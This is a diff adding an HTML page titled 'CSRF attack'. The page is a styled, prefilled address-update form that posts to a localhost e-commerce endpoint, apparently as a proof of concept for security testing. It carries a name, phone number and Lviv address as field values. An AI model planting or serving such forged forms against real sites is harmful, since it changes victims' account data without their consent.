@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF attack</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css"
+          integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
+    <style>
+        html, body {
+            display: flex;
+            justify-content: center;
+            height: 100%;
+        }
+
+        body, div, h1, form, input, p {
+            padding: 0;
+            margin: 0;
+            outline: none;
+            font-family: Roboto, Arial, sans-serif;
+            font-size: 16px;
+            color: #666;
+        }
+
+        h1 {
+            padding: 10px 0;
+            font-size: 32px;
+            font-weight: 300;
+            text-align: center;
+        }
+
+        p {
+            font-size: 12px;
+        }
+
+        hr {
+            color: #a9a9a9;
+            opacity: 0.3;
+        }
+
+        .main-block {
+            max-width: 440px;
+            min-height: 460px;
+            padding: 10px 0;
+            margin: auto;
+            border-radius: 5px;
+            border: solid 1px #ccc;
+            box-shadow: 1px 2px 5px rgba(0, 0, 0, .31);
+            background: #ebebeb;
+        }
+
+        form {
+            margin: 0 30px;
+        }
+
+        .account-type, .gender {
+            margin: 15px 0;
+        }
+
+        input[type=radio] {
+            display: none;
+        }
+
+        label#icon {
+            margin: 0;
+            border-radius: 5px 0 0 5px;
+        }
+
+        label.radio {
+            position: relative;
+            display: inline-block;
+            padding-top: 4px;
+            margin-right: 20px;
+            text-indent: 30px;
+            overflow: visible;
+            cursor: pointer;
+        }
+
+        label.radio:before {
+            content: "";
+            position: absolute;
+            top: 2px;
+            left: 0;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #1c87c9;
+        }
+
+        label.radio:after {
+            content: "";
+            position: absolute;
+            width: 9px;
+            height: 4px;
+            top: 8px;
+            left: 4px;
+            border: 3px solid #fff;
+            border-top: none;
+            border-right: none;
+            transform: rotate(-45deg);
+            opacity: 0;
+        }
+
+        input[type=radio]:checked + label:after {
+            opacity: 1;
+        }
+
+        input[type=text], input[type=password] {
+            width: calc(100% - 57px);
+            height: 36px;
+            margin: 13px 0 0 -5px;
+            padding-left: 10px;
+            border-radius: 0 5px 5px 0;
+            border: solid 1px #cbc9c9;
+            box-shadow: 1px 2px 5px rgba(0, 0, 0, .09);
+            background: #fff;
+        }
+
+        input[type=password] {
+            margin-bottom: 15px;
+        }
+
+        #icon {
+            display: inline-block;
+            padding: 9.3px 15px;
+            box-shadow: 1px 2px 5px rgba(0, 0, 0, .09);
+            background: #1c87c9;
+            color: #fff;
+            text-align: center;
+        }
+
+        .btn-block {
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px 0;
+            margin: 10px auto;
+            border-radius: 5px;
+            border: none;
+            background: #1c87c9;
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        button:hover {
+            background: #26a9e0;
+        }
+    </style>
+</head>
+<body>
+<div class="main-block">
+
+    <h1 style="color: green">
+        Update Account Info
+    </h1>
+    <p id="GFG_UP" style="font-size: 20px; font-weight: bold;"></p>
+
+
+
+    <form action="http://localhost:8080/us/en/addressBook/updateAddress" method="post">
+        <div class="address-book__form">
+            <div class="address-form">
+                <div class="country-selector__wrapper">
+                    <div class="form-input">
+                        <div data-cs-mask="true" class="country-selector"><span>Delivering to <strong>United States</strong></span><input
+                                name="country" class=" " type="hidden" autocomplete="off" value="US"></div>
+                    </div>
+                </div>
+                <div class="address-name__wrapper">
+                    <div class="row">
+                        <div class="columns small-5 medium-2">
+                            <div class="form-input"><label for="titleCode"><span>Title</span></label><select name="titleCode"
+                                                                                                             class="address-form__title-input "
+                                                                                                             id="titleCode">
+                                <option value="">Select</option>
+                                <option value="mr">Mr</option>
+                                <option value="mrs">Mrs</option>
+                                <option value="miss">Miss</option>
+                                <option value="ms">Ms</option>
+                            </select></div>
+                        </div>
+                        <div class="columns medium-5">
+                            <div class="form-input"><label for="firstName"><span>First name</span></label><input name="firstName"
+                                                                                                                 class="form-input__input "
+                                                                                                                 type="text" id="firstName"
+                                                                                                                 maxlength="50"
+                                                                                                                 value="Marian"></div>
+
+                            <div class="form-input"><label for="firstName"><span>ID</span></label><input name="id"
+                                                                                                         class="form-input__input "
+                                                                                                         type="text" id="id" maxlength="50"
+                                                                                                         value="9241247481879"></div>
+                        </div>
+                        <div class="columns medium-5">
+                            <div class="form-input"><label for="lastName"><span>Last name</span></label><input name="lastName"
+                                                                                                               class="form-input__input "
+                                                                                                               type="text"
+                                                                                                               id="lastName" maxlength="50"
+                                                                                                               value="Dorosh"></div>
+                        </div>
+                    </div>
+                </div>
+                <hr>
+                <div class="phone-number__wrapper">
+                    <div class="row">
+                        <div class="column">
+                            <div class="form-input"><label for="phone"><span>Phone number</span></label><input name="phone"
+                                                                                                               class="address-form__phone-input "
+                                                                                                               type="tel" id="phone"
+                                                                                                               value="+380978564636">
+                                <p class="address-form__phone-notice"><span>We will only use this to contact you about your order</span></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <hr>
+                <div class="address-group">
+                    <hr>
+                    <div class="address-group__wrapper"><input name="id" class=" " type="hidden" value="9241247481879">
+                        <div class="row">
+                            <div class="column large-7">
+                                <div class="form-input"><label for="line1"><span>Address 1</span></label><input name="line1"
+                                                                                                                class="form-input__input "
+                                                                                                                type="text"
+                                                                                                                id="line1"
+                                                                                                                value="Ivana Vyhovskoho St, 29">
+                                </div>
+                                <div class="form-input"><label for="line2"><span>Address 2</span> <span class="optional-field"><span>Optional</span></span></label><input
+                                        name="line2"
+                                        class="form-input__input "
+                                        type="text" id="line2"
+                                        value=""></div>
+                                <div class="form-input"><label for="city"><span>City</span></label><input name="city"
+                                                                                                          class="form-input__input "
+                                                                                                          type="text" id="city"
+                                                                                                          value="Lviv"></div>
+                                <div class="row">
+                                    <div class="columns small-4">
+                                        <div class="form-input"><label for="postalCode"><span>Zip code</span></label><input
+                                                name="postalCode" class="form-input__input "
+                                                type="text" id="postalCode" value="81700"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <hr>
+                    <div class="region-selector__wrapper">
+                        <div class="row">
+                            <div class="column large-7">
+                                <div class="form-input"><label for="regionIsocode"><span>State</span></label><select name="regionIsocode"
+                                                                                                                     class="region-selector__select "
+                                                                                                                     id="regionIsocode">
+                                    <option value="">Please select</option>
+                                    <option value="US-AL">Alabama</option>
+                                    <option value="US-AK">Alaska</option>
+                                    <option value="US-AZ">Arizona</option>
+                                    <option value="US-AR">Arkansas</option>
+                                    <option value="US-CA">California</option>
+                                    <option value="US-CO">Colorado</option>
+                                    <option value="US-CT">Connecticut</option>
+                                    <option value="US-DE">Delaware</option>
+                                    <option value="US-DC">District of Columbia</option>
+                                    <option value="US-FL">Florida</option>
+                                    <option value="US-GA">Georgia</option>
+                                    <option value="US-HI">Hawaii</option>
+                                    <option value="US-ID">Idaho</option>
+                                    <option value="US-IL">Illinois</option>
+                                    <option value="US-IN">Indiana</option>
+                                    <option value="US-IA">Iowa</option>
+                                    <option value="US-KS">Kansas</option>
+                                    <option value="US-KY">Kentucky</option>
+                                    <option value="US-LA">Louisiana</option>
+                                    <option value="US-ME">Maine</option>
+                                    <option value="US-MD">Maryland</option>
+                                    <option value="US-MA">Massachusetts</option>
+                                    <option value="US-MI">Michigan</option>
+                                    <option value="US-MN">Minnesota</option>
+                                    <option value="US-MS">Mississippi</option>
+                                    <option value="US-MO">Missouri</option>
+                                    <option value="US-MT">Montana</option>
+                                    <option value="US-NE">Nebraska</option>
+                                    <option value="US-NV">Nevada</option>
+                                    <option value="US-NH">New Hampshire</option>
+                                    <option value="US-NJ">New Jersey</option>
+                                    <option value="US-NM">New Mexico</option>
+                                    <option value="US-NY">New York</option>
+                                    <option value="US-NC">North Carolina</option>
+                                    <option value="US-ND">North Dakota</option>
+                                    <option value="US-OH">Ohio</option>
+                                    <option value="US-OK">Oklahoma</option>
+                                    <option value="US-OR">Oregon</option>
+                                    <option value="US-PA">Pennsylvania</option>
+                                    <option value="US-RI">Rhode Island</option>
+                                    <option value="US-SC">South Carolina</option>
+                                    <option value="US-SD">South Dakota</option>
+                                    <option value="US-TN">Tennessee</option>
+                                    <option value="US-TX">Texas</option>
+                                    <option value="US-UT">Utah</option>
+                                    <option value="US-VT">Vermont</option>
+                                    <option value="US-VA">Virginia</option>
+                                    <option value="US-WA">Washington</option>
+                                    <option value="US-WV">West Virginia</option>
+                                    <option value="US-WI">Wisconsin</option>
+                                    <option value="US-WY">Wyoming</option>
+                                </select></div>
+                            </div>
+                        </div>
+                    </div>
+                    <hr>
+                </div>
+            </div>
+        </div>
+        <div>
+            <button onclick="putCookie(document.getElementsByTagName('form'));" type="submit"
+                    class="button address-book__btn address-book__btn--edit"><span>Update Address</span></button>
+        </div>
+        <a class="button address-book__btn--go-back" href="#/address-book/list"><span>Back to address book</span></a></form>
+
+</div>
+</body>
+</html>
